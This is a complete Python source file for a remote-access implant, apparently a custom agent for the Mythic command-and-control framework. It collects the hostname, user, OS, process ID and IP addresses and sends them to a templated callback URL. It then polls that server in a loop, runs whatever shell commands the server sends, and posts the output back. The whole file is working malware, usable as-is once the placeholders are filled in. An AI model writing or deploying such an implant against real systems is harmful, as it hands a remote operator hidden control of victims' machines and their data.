#!/usr/bin/env python3
import argparse
import base64
import json
import os
import platform
import socket
import subprocess
import sys
import time
import urllib.request
import urllib.error
from uuid import uuid4


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="MyAgent implant")
    parser.add_argument("--uuid", default="{{UUID}}", help="Assigned implant UUID")
    parser.add_argument("--url", default="{{URL}}", help="Mythic callback URL base")
    parser.add_argument("--interval", type=int, default=int("{{INTERVAL}}"), help="Polling interval in seconds")
    return parser


def system_info() -> dict:
    hostname = socket.gethostname()
    user = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    os_name = platform.system()
    release = platform.release()
    arch = platform.machine()
    pid = os.getpid()
    ips = []
    try:
        for family, _, _, _, sockaddr in socket.getaddrinfo(socket.gethostname(), None):
            ip = sockaddr[0]
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    return {
        "host": hostname,
        "user": user,
        "os": os_name,
        "release": release,
        "architecture": arch,
        "pid": pid,
        "ips": ips,
    }


def encode_message(uuid_value: str, data: dict) -> str:
    # Matches the requested pattern: base64(uuid + json(data))
    payload = uuid_value + json.dumps(data, separators=(",", ":"), sort_keys=True)
    return base64.b64encode(payload.encode("utf-8")).decode("utf-8")


def send_message(url: str, uuid_value: str, data: dict) -> dict:
    endpoint = url.rstrip("/") + "/c2-endpoint"
    encoded = encode_message(uuid_value, data)
    body = json.dumps({"message": encoded}).encode("utf-8")
    request = urllib.request.Request(
        endpoint,
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "my_agent/1.0",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            response_bytes = response.read()
            if not response_bytes:
                return {}
            try:
                return json.loads(response_bytes.decode("utf-8"))
            except Exception:
                return {"raw": response_bytes.decode("utf-8", errors="ignore")}
    except urllib.error.HTTPError as exc:
        try:
            raw = exc.read().decode("utf-8", errors="ignore")
            return {"http_error": exc.code, "raw": raw}
        except Exception:
            return {"http_error": exc.code}
    except Exception as exc:
        return {"error": str(exc)}


def parse_response(resp: dict, fallback_uuid: str):
    callback_id = resp.get("callback_id") or resp.get("uuid") or fallback_uuid
    tasks = resp.get("tasks") or []
    return callback_id, tasks


def execute_command(command_line: str) -> str:
    command = command_line.strip()
    if not command:
        return ""
    try:
        completed = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = completed.stdout or ""
        err = completed.stderr or ""
        result = output + err
        if not result:
            return "[no output]"
        return result.strip()
    except Exception as exc:
        return f"ERROR: {exc}"


def main() -> int:
    parser = build_arg_parser()
    args = parser.parse_args()

    uuid_value = args.uuid if args.uuid and args.uuid != "{{UUID}}" else "{{UUID}}"
    url = args.url if args.url and args.url != "{{URL}}" else "{{URL}}"
    interval = max(5, int(args.interval if args.interval is not None else int("{{INTERVAL}}")))

    # Initial check-in
    info = system_info()
    checkin = {
        "action": "checkin",
        "uuid": uuid_value,
        "host": info["host"],
        "user": info["user"],
        "os": info["os"],
        "release": info["release"],
        "architecture": info["architecture"],
        "pid": info["pid"],
        "ips": info["ips"],
        "time": int(time.time()),
    }
    response = send_message(url, uuid_value, checkin)
    callback_id = response.get("callback_id") or response.get("uuid") or uuid_value

    # Main loop
    while True:
        tasking = {
            "action": "get_tasking",
            "uuid": uuid_value,
            "callback_id": callback_id,
        }
        task_response = send_message(url, uuid_value, tasking)
        tasks = task_response.get("tasks") or []
        for task in tasks:
            task_id = task.get("id") or task.get("task_id")
            command_line = task.get("command") or task.get("cmd") or ""
            if not command_line:
                continue

            if command_line.lower() in ("exit", "quit", "shutdown"):
                sys.exit(0)

            output = execute_command(command_line)
            result_message = {
                "action": "post_response",
                "uuid": uuid_value,
                "callback_id": callback_id,
                "task_id": task_id,
                "output": output,
            }
            send_message(url, uuid_value, result_message)

        time.sleep(interval)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(0)
